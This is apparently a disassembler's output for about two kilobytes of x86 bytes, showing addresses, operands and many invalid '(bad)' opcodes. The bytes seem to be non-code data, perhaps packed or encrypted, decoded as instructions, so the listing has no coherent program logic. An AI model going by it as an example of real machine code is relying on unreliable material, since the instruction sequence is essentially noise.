  407828:	and    BYTE PTR [edi-0x80],0xb9
  40782c:	int    0x47
  40782e:	xor    DWORD PTR [eax+0x7b],edx
  407831:	dec    eax
  407832:	push   ds
  407833:	or     al,0xad
  407835:	(bad)  
  407836:	(bad)  
  407838:	sar    DWORD PTR [edi],1
  40783a:	(bad)  
  40783b:	aam    0xe6
  40783d:	hlt    
  40783e:	add    DWORD PTR ds:0x8c5d58e7,0xffffffe6
  407845:	arpl   WORD PTR [edx+ebx*1+0x5a],bp
  407849:	adc    bl,ah
  40784b:	ins    BYTE PTR es:[edi],dx
  40784c:	lds    ebp,FWORD PTR [edx+ebp*1]
  40784f:	in     al,0xcf
  407851:	mov    edx,ds
  407853:	dec    ecx
  407854:	ins    DWORD PTR es:[edi],dx
  407855:	jbe    0x407898
  407857:	push   ss
  407858:	inc    ebp
  407859:	retf   
  40785a:	out    0x68,al
  40785c:	aas    
  40785d:	mov    esp,DWORD PTR [ecx]
  40785f:	lods   eax,DWORD PTR ds:[esi]
  407860:	jne    0x4078a4
  407862:	cli    
  407863:	and    ecx,DWORD PTR [edx-0x7c]
  407866:	loop   0x407899
  407868:	aam    0x94
  40786a:	cdq    
  40786b:	sbb    DWORD PTR [ebp+0x78],ecx
  40786e:	mov    ebp,0xc8126f64
  407873:	xchg   ebp,eax
  407874:	rcr    BYTE PTR [ebx+eiz*4],cl
  407877:	repz and eax,0xd78aed1c
  40787d:	mov    edx,0x97f6299f
  407882:	loopne 0x4078cd
  407884:	inc    eax
  407885:	jmp    0xcdd3cd1e
  40788a:	loop   0x407821
  40788c:	add    DWORD PTR [esi+0x41],eax
  40788f:	pop    ecx
  407890:	push   es
  407891:	popf   
  407892:	or     al,0x59
  407894:	mov    ch,0xa3
  407896:	bound  edx,QWORD PTR ds:0x8e0cf36
  40789c:	(bad)  
  40789d:	xor    al,0x44
  40789f:	fimul  DWORD PTR [eax+0x3d2381a8]
  4078a5:	and    cl,cl
  4078a7:	cwde   
  4078a8:	cmp    BYTE PTR [edi+ebp*4],0x18
  4078ac:	ins    BYTE PTR es:[edi],dx
  4078ad:	(bad)  
  4078ae:	out    0xfb,eax
  4078b0:	mov    ds:0x52952c12,al
  4078b5:	cli    
  4078b6:	adc    BYTE PTR [edx-0x66a7baf5],dh
  4078bc:	add    DWORD PTR [esi+0x3d38a829],0x541cf8ea
  4078c6:	test   BYTE PTR [ebx+0x7],ch
  4078c9:	or     eax,0x6c04f90b
  4078ce:	mov    ds:0x25b977b,eax
  4078d3:	das    
  4078d4:	pusha  
  4078d5:	or     DWORD PTR [esi-0x26],esp
  4078d8:	cmp    ebx,edi
  4078da:	jns    0x40785f
  4078dc:	loop   0x4078f2
  4078de:	or     al,0x17
  4078e0:	icebp  
  4078e1:	sub    esi,DWORD PTR [edi-0x768ab2f4]
  4078e7:	and    cl,BYTE PTR [edi]
  4078e9:	call   0xa9f4b09e
  4078ee:	clc    
  4078ef:	inc    esi
  4078f0:	rcl    DWORD PTR [ebp-0x20620e78],cl
  4078f6:	arpl   WORD PTR [ecx+eax*1+0x3c],cx
  4078fa:	ss adc dl,cl
  4078fd:	aas    
  4078fe:	clc    
  4078ff:	fld    QWORD PTR [ebp+ecx*4-0x18]
  407903:	cli    
  407904:	xchg   esp,eax
  407905:	sar    DWORD PTR [ebx-0x7523249],cl
  40790b:	jb     0x40797f
  40790d:	(bad)  
  40790e:	popaw  
  407910:	and    ebx,DWORD PTR [ecx-0x6c47d468]
  407916:	mov    bl,0xcb
  407918:	leave  
  407919:	idiv   bl
  40791b:	ret    
  40791c:	(bad)  
  40791e:	hlt    
  40791f:	imul   ecx,DWORD PTR [eax-0x6197cfd5],0xffffffbc
  407926:	push   edx
  407927:	jo     0x407978
  407929:	iret   
  40792a:	jecxz  0x4078bc
  40792c:	bound  edx,QWORD PTR [edx]
  40792e:	imul   esp,esi,0x48
  407931:	xor    eax,0xfbb8380a
  407936:	xchg   edi,eax
  407937:	fs xor eax,ecx
  40793a:	loope  0x40792c
  40793c:	es mov edx,0x15aa4da9
  407942:	push   ecx
  407943:	dec    bx
  407945:	ins    DWORD PTR es:[edi],dx
  407946:	icebp  
  407947:	(bad)  
  407948:	sbb    al,0xfa
  40794a:	inc    ebp
  40794b:	jne    0x4079ba
  40794d:	outs   dx,BYTE PTR ds:[esi]
  40794e:	inc    ebp
  40794f:	bound  ecx,QWORD PTR [esi]
  407951:	jb     0x4078df
  407953:	loop   0x40791b
  407955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407956:	test   al,0x64
  407958:	sbb    ebx,esp
  40795a:	sbb    ah,al
  40795c:	xchg   edi,eax
  40795d:	int3   
  40795e:	into   
  40795f:	adc    al,0xf4
  407961:	fiadd  DWORD PTR [eax+esi*1+0x769a0762]
  407968:	sub    BYTE PTR [ebx],dh
  40796a:	jno    0x4079ae
  40796c:	shl    bh,cl
  40796e:	pop    ds
  40796f:	mov    ds:0xfa1286cd,al
  407974:	push   edi
  407975:	leave  
  407976:	cli    
  407977:	xor    dl,BYTE PTR [edx]
  407979:	xchg   ebp,eax
  40797a:	(bad)  
  40797b:	int    0x32
  40797d:	fwait
  40797e:	sbb    dl,BYTE PTR [edi+ecx*4+0x3c]
  407982:	dec    edi
  407983:	in     eax,dx
  407984:	cmp    DWORD PTR [ecx-0x49575742],esp
  40798a:	or     bl,BYTE PTR [ecx+0x30]
  40798d:	push   edx
  40798e:	mov    bh,0xa2
  407990:	sub    esi,DWORD PTR [edi+eiz*2]
  407993:	cs jecxz 0x4079b2
  407996:	lahf   
  407997:	sar    BYTE PTR [edx+0x15],0x33
  40799b:	jns    0x40794f
  40799d:	cmp    BYTE PTR [eax+0x1cb8fce1],dl
  4079a3:	daa    
  4079a4:	ror    DWORD PTR [eax-0x46],cl
  4079a7:	stc    
  4079a8:	cmp    al,0xcc
  4079aa:	xchg   esi,eax
  4079ab:	es inc esi
  4079ad:	adc    esp,esp
  4079af:	(bad)  
  4079b1:	cld    
  4079b2:	int    0x62
  4079b4:	mov    bl,0x19
  4079b6:	(bad)  
  4079b7:	jnp    0x407939
  4079b9:	retf   0x4c0e
  4079bc:	fwait
  4079bd:	jl     0x407976
  4079bf:	in     al,dx
  4079c0:	mov    ebp,0xc50444d3
  4079c5:	aaa    
  4079c6:	push   esp
  4079c7:	sub    DWORD PTR ds:0x7bb1665c,edx
  4079cd:	dec    edx
  4079ce:	cli    
  4079cf:	xor    bh,BYTE PTR [ecx-0x6c]
  4079d2:	repnz fdivr QWORD PTR fs:[ecx+0x9f6f55]
  4079da:	mov    eax,ds:0x2a87d1fb
  4079df:	xchg   ebp,eax
  4079e0:	loop   0x4079ad
  4079e2:	mov    esp,0xf99a94b0
  4079e7:	pushf  
  4079e8:	jne    0x4079e3
  4079ea:	fisttp DWORD PTR ds:0xc0ec4e9c
  4079f0:	mov    esp,0x29836406
  4079f5:	and    edx,DWORD PTR [edi+0x349479ba]
  4079fb:	aas    
  4079fc:	loope  0x407a2f
  4079fe:	cmp    edx,0x7
  407a01:	das    
  407a02:	xor    al,0xf4
  407a04:	mov    eax,cs:0xd24d4daf
  407a0a:	dec    esp
  407a0b:	iret   
  407a0c:	es es cmp eax,0x607b6c96
  407a13:	loopne 0x407a29
  407a15:	and    al,BYTE PTR [edi]
  407a17:	das    
  407a18:	mov    ebx,0x655379f6
  407a1d:	stos   DWORD PTR es:[edi],eax
  407a1e:	idiv   DWORD PTR [edx+0x6ce7b93d]
  407a24:	add    eax,0x9f9505c0
  407a29:	push   edx
  407a2a:	or     eax,0x580325ad
  407a2f:	mov    ds:0x3cbec482,al
  407a34:	jmp    0x2962511
  407a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a3a:	lock aaa 
  407a3c:	sub    cl,BYTE PTR [esi+0x19892140]
  407a42:	into   
  407a43:	scas   eax,DWORD PTR es:[edi]
  407a44:	out    0xbc,eax
  407a46:	pop    esp
  407a47:	ret    0x8369
  407a4a:	pop    ss
  407a4b:	icebp  
  407a4c:	or     eax,0xb4a62af6
  407a51:	pop    eax
  407a52:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  407a54:	rol    BYTE PTR [ecx+0x6e0afa27],0x2
  407a5b:	shl    BYTE PTR [ecx-0x44384b44],1
  407a61:	xchg   ebx,eax
  407a62:	xchg   edx,eax
  407a63:	inc    ebx
  407a64:	dec    esp
  407a65:	mov    esi,0xa5daf466
  407a6a:	cwde   
  407a6b:	ja     0x4079f8
  407a6d:	pop    esp
  407a6e:	cli    
  407a6f:	push   es
  407a70:	mov    ah,0x70
  407a72:	cwde   
  407a73:	adc    eax,0x8fdd2e1a
  407a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a79:	pop    esp
  407a7a:	lods   al,BYTE PTR ds:[esi]
  407a7b:	out    0xa8,al
  407a7d:	inc    ebp
  407a7e:	dec    ecx
  407a7f:	sar    esp,0x2
  407a82:	stc    
  407a83:	dec    edx
  407a84:	js     0x407aff
  407a86:	mov    al,ds:0xc5b9100d
  407a8b:	sti    
  407a8c:	mov    al,cl
  407a8e:	jmp    0x78fa:0x166e013a
  407a95:	sub    eax,0xf3c0cc49
  407a9a:	ror    bh,0x83
  407a9d:	jae    0x407b18
  407a9f:	xor    dh,bl
  407aa1:	lds    esp,FWORD PTR [eax+0x1b19805b]
  407aa7:	imul   DWORD PTR [ebp+edx*2-0x3ad213ff]
  407aae:	inc    esi
  407aaf:	mov    edi,0x2e7b018b
  407ab4:	and    DWORD PTR [edi],0xffffff9b
  407ab7:	xchg   edx,eax
  407ab8:	adc    dh,BYTE PTR [eax]
  407aba:	cli    
  407abb:	xor    ecx,eax
  407abd:	(bad)  [ebx+0x5e399f8e]
  407ac3:	popa   
  407ac4:	fild   QWORD PTR [eax+0x6d1c847a]
  407aca:	sub    eax,0xe01fec1b
  407acf:	not    cl
  407ad1:	stc    
  407ad2:	ror    DWORD PTR [ebp+0x7d4e2208],cl
  407ad8:	cmp    BYTE PTR [esi],bl
  407ada:	lods   eax,DWORD PTR ds:[esi]
  407adb:	stc    
  407adc:	dec    edx
  407add:	xor    al,0x3e
  407adf:	inc    edx
  407ae0:	adc    DWORD PTR [ecx+eax*1],ecx
  407ae3:	mov    ebx,0xbc2916dc
  407ae8:	sub    ebp,DWORD PTR [edx+0x56029aa1]
  407aee:	sbb    eax,0xc6ae3b82
  407af3:	ja     0x407a95
  407af5:	pop    es
  407af6:	loope  0x407ade
  407af8:	aad    0xdb
  407afa:	inc    ebx
  407afb:	je     0x407af1
  407afd:	fdivr  st,st(5)
  407aff:	lock mov edx,0x1b7c2872
  407b05:	dec    ebx
  407b06:	mov    edi,0x41ea4bb2
  407b0b:	pop    es
  407b0c:	push   ss
  407b0d:	cmp    edx,DWORD PTR [esi-0x44]
  407b10:	lahf   
  407b11:	cmp    eax,0x2a0fe9cc
  407b16:	jb     0x407b31
  407b18:	bound  eax,QWORD PTR ds:0x74078e64
  407b1e:	(bad)  
  407b1f:	repz imul edx,ecx,0xffffffce
  407b23:	(bad)  [edi]
  407b25:	and    ebx,DWORD PTR [eax+0x41e7fa59]
  407b2b:	xchg   ecx,eax
  407b2c:	and    DWORD PTR [eax+edi*2-0x797affd2],0x6926e88c
  407b37:	jl     0x407b2f
  407b39:	push   ds
  407b3a:	in     eax,dx
  407b3b:	xchg   ebx,eax
  407b3c:	push   es
  407b3d:	xchg   edi,eax
  407b3e:	ja     0x407bb9
  407b40:	fmul   QWORD PTR [esi+0x3fa1bca5]
  407b46:	leave  
  407b47:	jecxz  0x407bc1
  407b49:	mov    al,0x67
  407b4b:	cmc    
  407b4c:	add    BYTE PTR [edx],0xe0
  407b4f:	aad    0xde
  407b51:	xchg   dh,ah
  407b53:	stos   DWORD PTR es:[edi],eax
  407b54:	mov    ds:0xd66c6c05,eax
  407b59:	mov    ecx,0x218e6e16
  407b5e:	add    cl,BYTE PTR [edi+0x6c]
  407b61:	clc    
  407b62:	add    dl,BYTE PTR [esi-0x50]
  407b65:	popf   
  407b66:	jno    0x407bc0
  407b68:	fwait
  407b69:	mov    ch,0xa8
  407b6b:	fild   DWORD PTR [eax+0x737086f3]
  407b71:	stc    
  407b72:	mov    ebx,0xea79914e
  407b77:	mov    ch,0x96
  407b79:	enter  0xc8bb,0xab
  407b7d:	jl     0x407b41
  407b7f:	js     0x407bea
  407b81:	jnp    0x407ba9
  407b83:	shr    DWORD PTR [esi-0x608948dd],1
  407b89:	sbb    edi,eax
  407b8b:	(bad)  
  407b8c:	pop    ecx
  407b8d:	bnd jno 0x407bf1
  407b90:	sbb    ch,bl
  407b92:	popf   
  407b93:	pushf  
  407b94:	and    al,0xa8
  407b96:	sub    DWORD PTR [edi-0x2dc362b2],esp
  407b9c:	das    
  407b9d:	stc    
  407b9e:	icebp  
  407b9f:	fdivr  QWORD PTR [edi+edx*4]
  407ba2:	push   es
  407ba3:	inc    ecx
  407ba4:	add    eax,0x3d5a52
  407ba9:	repz or bh,BYTE PTR [edx]
  407bac:	fimul  WORD PTR [eax]
  407bae:	sahf   
  407baf:	and    BYTE PTR [ecx+0x6b],bh
  407bb2:	jae    0x407b7c
  407bb4:	cmp    al,0x3b
  407bb6:	jle    0x407c0a
  407bb8:	sti    
  407bb9:	inc    esi
  407bba:	cmp    BYTE PTR [ecx-0x536a1fcc],bl
  407bc0:	shl    ch,0xd8
  407bc3:	push   edx
  407bc4:	test   al,0x64
  407bc6:	loop   0x407c39
  407bc8:	mov    al,BYTE PTR [eax+0x7c]
  407bcb:	xchg   edi,eax
  407bcc:	rcl    cl,1
  407bce:	cs xchg edi,eax
  407bd0:	inc    esi
  407bd1:	outs   dx,BYTE PTR ds:[esi]
  407bd2:	lds    edi,FWORD PTR [edi]
  407bd4:	pop    ebp
  407bd5:	pop    edi
  407bd6:	in     al,dx
  407bd7:	jno    0x407bb7
  407bd9:	gs pop es
  407bdb:	cmp    dh,dh
  407bdd:	test   DWORD PTR [ebp+0x7a12e257],esi
  407be3:	mov    dh,BYTE PTR [edi]
  407be5:	sub    eax,0xfa56e29d
  407bea:	xlat   BYTE PTR ds:[ebx]
  407beb:	mov    BYTE PTR ds:0x630c0684,dh
  407bf1:	cli    
  407bf2:	dec    edx
  407bf3:	sbb    eax,esi
  407bf5:	ror    cl,cl
  407bf7:	or     BYTE PTR [ebx-0x4d357721],ch
  407bfd:	mov    esp,0x61c980b3
  407c02:	mov    al,0xc9
  407c04:	mov    al,ds:0x71a1630c
  407c09:	sahf   
  407c0a:	test   BYTE PTR [eax],ch
  407c0c:	leave  
  407c0d:	push   ecx
  407c0e:	mov    ch,0x78
  407c10:	mov    esi,0x6e785b3e
  407c15:	inc    ebp
  407c16:	dec    ebp
  407c17:	imul   esp,DWORD PTR [edi],0x110c91cb
  407c1d:	mov    ebx,0x9943f79e
  407c22:	push   esi
  407c23:	test   eax,0xb5b8d10d
  407c28:	add    edi,DWORD PTR [ebx+0x38]
  407c2b:	test   eax,0x3a0f7b71
  407c30:	pop    ebx
  407c31:	imul   ecx,DWORD PTR [eax-0x64],0x2c
  407c35:	push   ebx
  407c36:	jne    0x407bdf
  407c38:	push   ss
  407c39:	mov    edi,0x9b2e87b4
  407c3e:	jmp    0xb747:0xafa8b2df
  407c45:	sbb    eax,0xd5632507
  407c4a:	popa   
  407c4b:	loopne 0x407c56
  407c4d:	sub    BYTE PTR [ecx],bh
  407c4f:	repz js 0x407c6e
  407c52:	or     eax,0x993f664e
  407c57:	sbb    eax,0x3415d9f6
  407c5c:	mov    ah,0x8d
  407c5e:	sbb    al,BYTE PTR [edx+edx*1+0x45de244b]
  407c65:	test   DWORD PTR [ecx-0x32],edi
  407c68:	xchg   DWORD PTR [esi-0xe4b6b56],ebx
  407c6e:	inc    esi
  407c6f:	and    dl,al
  407c71:	enter  0xef1b,0xd2
  407c75:	vpshad ymm4,[eax+0xc],xmm1
  407c7b:	(bad)  [esi+eax*8-0x63]
  407c7f:	jnp    0x407c07
  407c81:	fsub   QWORD PTR [edi+edi*2-0x576db300]
  407c88:	lahf   
  407c89:	cmp    esp,ecx
  407c8b:	into   
  407c8c:	div    BYTE PTR [edx-0x8]
  407c8f:	iret   
  407c90:	inc    ebx
  407c91:	test   DWORD PTR [ebx+0x349ca67],esi
  407c97:	pop    edi
  407c98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c99:	xchg   esi,eax
  407c9a:	cld    
  407c9b:	mov    al,ds:0x5c7abe0f
  407ca0:	sbb    edi,esi
  407ca2:	shr    si,cl
  407ca5:	icebp  
  407ca6:	mov    dl,0x89
  407ca8:	push   0x3187973c
  407cad:	int    0xe2
  407caf:	inc    ecx
  407cb0:	aas    
  407cb1:	push   ds
  407cb2:	mov    esp,0xa226ce93
  407cb7:	dec    esp
  407cb8:	xor    DWORD PTR [edx+edi*2-0x2e],eax
  407cbc:	daa    
  407cbd:	push   0x4a5f11cf
  407cc2:	aam    0x1a
  407cc4:	aad    0x6e
  407cc6:	(bad)  
  407cc7:	inc    ebp
  407cc8:	mov    BYTE PTR [ecx],al
  407cca:	push   edx
  407ccb:	jns    0x407d12
  407ccd:	das    
  407cce:	and    edi,DWORD PTR [edx]
  407cd0:	xor    al,0x79
  407cd2:	fiadd  WORD PTR [esi+0x710ab251]
  407cd8:	push   esi
  407cd9:	fsubrp st(5),st
  407cdb:	pop    ebp
  407cdc:	in     eax,dx
  407cdd:	in     al,dx
  407cde:	adc    eax,0x1d6be95
  407ce3:	or     ebp,DWORD PTR [ebp-0xac4516d]
  407ce9:	or     al,0x9f
  407ceb:	dec    edx
  407cec:	sub    ebp,esp
  407cee:	call   0x8918acad
  407cf3:	fld    DWORD PTR [edi-0x784982db]
  407cf9:	xchg   ecx,eax
  407cfa:	and    DWORD PTR [edi+0x135caa5e],0xffffff83
  407d01:	mov    ss,WORD PTR [ebx+ecx*1]
  407d04:	cmpps  xmm7,XMMWORD PTR [edi],0x5e
  407d08:	mov    DWORD PTR ds:0x57197798,0xa032a572
  407d12:	jne    0x407ce8
  407d14:	jo     0x407d95
  407d16:	pop    esp
  407d17:	fwait
  407d18:	pushf  
  407d19:	into   
  407d1a:	push   esi
  407d1b:	lock or al,BYTE PTR [ebx-0x12c45fde]
  407d22:	pusha  
  407d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d24:	mov    eax,ds:0x973ee021
  407d29:	adc    dh,dh
  407d2b:	xor    BYTE PTR [ecx+0x11],0x93
  407d2f:	mov    DWORD PTR [ecx-0xe],edx
  407d32:	es xchg esp,eax
  407d34:	shl    DWORD PTR [ebx-0x20c70855],cl
  407d3a:	mov    bh,0x2c
  407d3c:	adc    BYTE PTR [edx-0x3c],dl
  407d3f:	in     al,0xd2
  407d41:	jl     0x407d3e
  407d43:	es lock scas al,BYTE PTR es:[edi]
  407d46:	sbb    BYTE PTR [edx],al
  407d48:	cwde   
  407d49:	xor    ecx,DWORD PTR [ecx]
  407d4b:	std    
  407d4c:	pop    edx
  407d4d:	add    BYTE PTR [esi-0x40],0xc7
  407d51:	fidivr DWORD PTR [eax-0x54290dc7]
  407d57:	(bad)  
  407d58:	pop    ebp
  407d59:	and    eax,0x2836321f
  407d5e:	xor    edx,0xffffff9d
  407d61:	jge    0x407dcd
  407d63:	jmp    0x2aede11a
  407d68:	arpl   WORD PTR [edx+0x36],ax
  407d6b:	mov    bh,BYTE PTR [ecx-0x64eef298]
  407d71:	sbb    ah,BYTE PTR [ecx]
  407d73:	inc    ebp
  407d74:	jns    0x407d03
  407d76:	jo     0x407d3c
  407d78:	sbb    ah,BYTE PTR [ecx-0x14]
  407d7b:	dec    ecx
  407d7c:	mov    al,ds:0x4010cc24
  407d81:	stos   BYTE PTR es:[edi],al
  407d82:	(bad)  
  407d83:	out    0x9e,eax
  407d85:	add    al,0xec
  407d87:	push   edi
  407d88:	clc    
  407d89:	adc    al,0xce
  407d8b:	out    dx,al
  407d8c:	mov    al,0xa1
  407d8e:	(bad)  
  407d8f:	aas    
  407d90:	and    edx,0xbdd39ca
  407d96:	mov    ah,0x4d
  407d98:	and    al,0x81
  407d9a:	and    DWORD PTR [ecx],ebx
  407d9c:	call   0x39fc1522
  407da1:	es push esp
  407da3:	or     al,0x5f
  407da5:	dec    ecx
  407da6:	ret    
  407da7:	sub    dl,BYTE PTR [edi-0x72]
  407daa:	mov    bh,0x69
  407dac:	ja     0x407e15
  407dae:	xchg   ebx,eax
  407daf:	neg    dl
  407db1:	mov    dh,0x38
  407db3:	popa   
  407db4:	mul    BYTE PTR [ecx*8+0x651f313f]
  407dbb:	mov    eax,ds:0x23630ff5
  407dc0:	adc    esi,ebx
  407dc2:	jmp    0x4434c240
  407dc7:	paddw  mm4,QWORD PTR [ebx-0x14]
  407dcb:	push   esi
  407dcc:	or     ah,BYTE PTR [ebp+0x610f23b3]
  407dd2:	or     eax,0x708eff20
  407dd7:	mov    ebx,0x5aa587ff
  407ddc:	(bad)
  407ddf:	mov    bl,0x38
  407de1:	sub    eax,DWORD PTR [esi-0x2d]
  407de4:	xchg   esp,eax
  407de5:	sbb    edi,DWORD PTR [edi-0x16761791]
  407deb:	push   0x541b08f
  407df0:	lods   eax,DWORD PTR ds:[esi]
  407df1:	icebp  
  407df2:	arpl   WORD PTR [ecx+eiz*1],ax
  407df5:	inc    ecx
  407df6:	adc    al,0x44
  407df8:	test   BYTE PTR [edi+ebx*1-0x7c],ah
  407dfc:	cs in  eax,0xe9
  407dff:	xor    BYTE PTR [esi],ch
  407e01:	mov    DWORD PTR [esi],ebx
  407e03:	enter  0xe143,0x98
  407e07:	xchg   DWORD PTR [ebp+ebp*4+0x6e],ebx
  407e0b:	inc    ebp
  407e0c:	(bad)  
  407e0d:	mov    eax,0xe8814d71
  407e12:	test   al,0xf7
  407e14:	adc    esi,edi
  407e16:	adc    eax,0x85723520
  407e1b:	in     al,dx
  407e1c:	fbld   TBYTE PTR [edi]
  407e1e:	dec    eax
  407e1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e21:	fldcw  WORD PTR [edi-0x61]
  407e24:	adc    dh,al
  407e26:	add    BYTE PTR [esi+0x4],bh
  407e29:	or     eax,0xd8398c76
  407e2e:	jecxz  0x407e9b
  407e30:	loope  0x407ddf
  407e32:	mov    ah,0x4d
  407e34:	in     al,0xd6
  407e36:	pop    edi
  407e37:	mov    ebp,0xa0b0b792
  407e3c:	popf   
  407e3d:	int3   
  407e3e:	pop    es
  407e3f:	xchg   esi,eax
  407e40:	sub    al,ah
  407e42:	pop    edx
  407e43:	js     0x407e66
  407e45:	mov    esi,0xd70ba330
  407e4a:	push   edi
  407e4b:	out    0x76,al
  407e4d:	stc    
  407e4e:	lock (bad) 
  407e50:	into   
  407e51:	inc    ecx
  407e52:	scas   al,BYTE PTR es:[edi]
  407e53:	jb     0x407e34
  407e55:	out    dx,eax
  407e56:	push   ebp
  407e57:	in     eax,0x55
  407e59:	fmul   QWORD PTR [esi+0x1e]
  407e5c:	ret    0x77ac
  407e5f:	push   edi
  407e60:	clc    
  407e61:	sbb    BYTE PTR [eax+0x587357b3],al
  407e67:	ds or  eax,0xcfdedd07
  407e6d:	jecxz  0x407ec3
  407e6f:	pop    esp
  407e70:	rcl    DWORD PTR [ebp+ebx*8+0x14ad3c29],cl
  407e77:	std    
  407e78:	sti    
  407e79:	out    dx,eax
  407e7a:	js     0x407ed4
  407e7c:	jbe    0x407ef8
  407e7e:	addr16 mov bh,0xd3
  407e81:	or     esi,esp
  407e83:	test   DWORD PTR [ecx+0x40],0xf9e81d52
  407e8a:	test   al,0x91
  407e8c:	sbb    eax,0xeaee0028
  407e91:	inc    esp
  407e92:	mov    DWORD PTR es:[eax],0x8e34b7b8
  407e99:	mov    ah,0x11
  407e9b:	xchg   ecx,eax
  407e9c:	cmp    BYTE PTR ds:0x848ea8fa,bl
  407ea2:	es popf 
  407ea4:	and    ah,BYTE PTR [esp+ecx*8+0x5c3b58da]
  407eab:	cmp    eax,0xe53c8578
  407eb0:	adc    esp,DWORD PTR [edx-0x29]
  407eb3:	sbb    al,bl
  407eb5:	mov    eax,ds:0x2d072450
  407eba:	or     DWORD PTR [esi+0xf],esp
  407ebd:	and    esi,DWORD PTR [esi+ecx*1]
  407ec0:	loope  0x407e84
  407ec2:	loope  0x407ef5
  407ec4:	popf   
  407ec5:	dec    eax
  407ec6:	push   ebp
  407ec7:	push   cs
  407ec8:	out    0x1e,al
  407eca:	jo     0x407f04
  407ecc:	les    edx,FWORD PTR [edx]
  407ece:	(bad)  
  407ecf:	(bad)  
  407ed0:	inc    edx
  407ed1:	mov    cs,edi
  407ed3:	pop    edi
  407ed4:	pusha  
  407ed5:	lods   al,BYTE PTR ds:[esi]
  407ed6:	adc    DWORD PTR [ecx-0x7546e5bf],0x6d
  407edd:	(bad)  
  407ede:	add    ah,BYTE PTR [ebx+0x5b4d0db5]
  407ee4:	add    al,0xd8
  407ee6:	mov    al,ds:0xc6204d3
  407eeb:	fs repz jae 0x407ee0
  407eef:	push   ecx
  407ef0:	push   ebp
  407ef1:	fstp   DWORD PTR [ecx+0x38a5e393]
  407ef7:	and    al,0x3b
  407ef9:	fdivr  QWORD PTR [esi+0x4b]
  407efc:	or     esp,DWORD PTR [ebx+0xc]
  407eff:	mul    DWORD PTR fs:[eax-0x2e8c9193]
  407f06:	mov    al,0x73
  407f08:	(bad)
  407f0c:	pushf  
  407f0d:	jg     0x407f34
  407f0f:	adc    ebx,DWORD PTR [ebx+0x42d170bc]
  407f15:	and    BYTE PTR [ebp-0x6b2f4da0],0x1d
  407f1c:	aad    0x6f
  407f1e:	mov    bl,0xe5
  407f20:	jbe    0x407f77
  407f22:	inc    edi
  407f23:	cmp    al,0x39
  407f25:	sub    DWORD PTR [eax+ebp*1-0x69dfcfd9],esi
  407f2c:	xchg   ecx,eax
  407f2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f2e:	push   0xffffff8b
  407f30:	nop
  407f31:	dec    eax
  407f32:	aad    0x1e
  407f34:	fdivr  QWORD PTR [ebx]
  407f36:	inc    eax
  407f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f38:	mov    edx,0xb9f3da82
  407f3d:	(bad)  
  407f3e:	and    esi,DWORD PTR [ecx]
  407f40:	aam    0x6
  407f42:	pop    ds
  407f43:	mov    ecx,0x5e3fa692
  407f48:	and    BYTE PTR [esi-0x1824467f],cl
  407f4e:	adc    ecx,esp
  407f50:	xchg   ebp,eax
  407f51:	mov    edi,0x65ad1982
  407f56:	inc    ecx
  407f57:	std    
  407f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f59:	lea    eax,[esi]
  407f5b:	nop
  407f5c:	mov    WORD PTR [eax+eax*4-0x6e],ss
  407f60:	xchg   edx,eax
  407f61:	aam    0x21
  407f63:	jno    0x407fda
  407f65:	rep outs dx,BYTE PTR ds:[esi]
  407f67:	aad    0x2e
  407f69:	mov    edi,eax
  407f6b:	sub    DWORD PTR [esi-0x4f028c81],0x4f
  407f72:	and    eax,0x131686c9
  407f77:	(bad)  
  407f78:	(bad)  
  407f79:	and    al,0xdd
  407f7b:	mov    bh,BYTE PTR [ebp-0x1b]
  407f7e:	mov    ds:0x7c4804ba,eax
  407f83:	dec    esi
  407f84:	pop    ebp
  407f85:	mov    eax,ds:0xa3e3d252
  407f8a:	mov    al,ds:0xcab846ce
  407f8f:	push   edi
  407f90:	sbb    al,0x96
  407f92:	pushf  
  407f93:	retf   
  407f94:	and    DWORD PTR [esi-0x198e0ca7],ebx
  407f9a:	in     al,dx
  407f9b:	fst    DWORD PTR [ecx]
  407f9d:	fsubr  QWORD PTR [ecx]
  407f9f:	cmova  ecx,DWORD PTR [eax-0x7f]
  407fa3:	invd   
  407fa5:	xor    eax,0x5ca8d2a9
  407faa:	pop    es
  407fab:	mov    ch,0x50
  407fad:	ror    bh,1
  407faf:	mov    ecx,0x2dd34529
  407fb4:	icebp  
  407fb5:	loop   0x407fa2
  407fb7:	xchg   edi,eax
  407fb8:	pusha  
  407fb9:	(bad)  [edi+0x40]
  407fbc:	ja     0x407fc1
  407fbe:	mov    esp,edi
  407fc0:	and    cl,BYTE PTR [eax-0x2d4bd7c9]
  407fc6:	fs jb  0x407f99
  407fc9:	mov    ds:0x8958c666,al
  407fce:	adc    al,0xca
  407fd0:	mov    ecx,0x2f34e722
  407fd5:	outs   dx,BYTE PTR ds:[esi]
  407fd6:	inc    esp
  407fd7:	cwde   
  407fd8:	fdivrp st(1),st
  407fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fdb:	lods   eax,DWORD PTR ds:[esi]
  407fdc:	jp     0x407f6c
  407fde:	(bad)  
  407fdf:	lods   eax,DWORD PTR ds:[esi]
  407fe0:	jmp    0xf8661951
  407fe5:	(bad)  
  407fe6:	and    al,0xea
  407fe8:	or     al,0xc4
  407fea:	mov    cl,0x1c
  407fec:	jle    0x407fd7
  407fee:	rcr    ebx,1
  407ff0:	out    dx,al
  407ff1:	fnsave [eax]
  407ff3:	mov    esp,0xdd4e3265
  407ff8:	int3   
  407ff9:	lods   al,BYTE PTR ds:[esi]
  407ffa:	popa   
  407ffb:	cmc    
  407ffc:	jnp    0x40804e
  407ffe:	xchg   DWORD PTR [ebx],eax
  408000:	jns    0x407f96
  408002:	adc    cl,0xab
  408005:	jno    0x408002
  408007:	outs   dx,DWORD PTR ds:[esi]
  408008:	push   edi
  408009:	in     al,dx
  40800a:	jnp    0x407fac
  40800c:	and    eax,0x70126606
  408011:	ins    BYTE PTR es:[edi],dx
  408012:	repnz dec esp
  408014:	adc    al,0xc1
